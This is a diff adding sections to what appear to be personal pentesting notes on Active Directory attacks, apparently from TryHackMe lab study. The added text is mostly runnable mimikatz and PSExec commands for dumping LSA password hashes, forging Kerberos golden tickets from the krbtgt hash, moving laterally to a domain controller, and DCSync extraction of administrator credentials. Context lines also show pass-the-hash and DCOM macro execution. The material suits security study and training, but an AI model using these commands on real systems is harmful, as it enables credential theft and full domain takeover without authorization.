@@ -201,6 +201,14 @@ Using extracted hashes for pass the hash.
     mimikatz # sekurlsa::pth /user:elliot.alderson /domain:za.tryhackme.com /ntlm:654e4545455e5de /run:"some command"
 
 
+## Extract hash password  
+
+```
+privilege::debug
+lsadump::lsa /patch
+```
+
+
 ## Pass the hash  
 
 From pass-the-hash toolkit.  
@@ -328,6 +336,30 @@ Check it has been created.
 
 `kerberos::list`  
 
+## Golden ticket  
+
+When a TGT is requested, the KDC encrypts it with a secret key which is the hashed password of the krbtgt account. If the hashed password is known, it can be used to create a custom TGT (golden ticket). A ticket can be created without administrative rights and its also possible on a machine that is not domain joined.  
+
+Delete existing tickets.  
+
+`kerberos::purge`  
+
+Get domain SID.  
+
+`whoami /user`  
+
+Create golden ticket.  
+
+```
+kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+```  
+
+Then launch a new command prompt to laterally move into with something like PSExec.  
+
+`misc::cmd`  
+
+NOTE: The golden ticket attack needs the domain name to access it with PSExec as using the ip will force NTLM authentication as is the same with over pass the hash.
+
 ## Distributed Component Object Model (DCOM)  
 
 DCOM is a system that is created for software components to interact with eachother over the network.  
@@ -392,6 +424,24 @@ $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
 $com.Run("mymacro")
 ```  
 
+## Lateral movement  
+
+Using PSexec to move to the domain controller.  
+
+`psexec.exe \\dc01 cmd.exe`  
+
+## Domain controller synchronization  
+
+To steal all administrative passwords:
+- Move laterally to domain controller and dump with mimikatz
+- Steal NTDS.dit, which is a copy of all AD accounts on the disk.
+- Use Directory Replication Service Remote Protocol, which is a replication function within AD because there is usually more than one domain controller in production. A approriate SID is required for this, not another DC.
+
+Logged in as a domain administrator and using mimikatz.  
+
+`lsadump::dcsync /user:Administrator`  
+
+With the above hashes we can request a sync without ever logging into the DC.
 
 
 ## Windows Management Instrumentation  
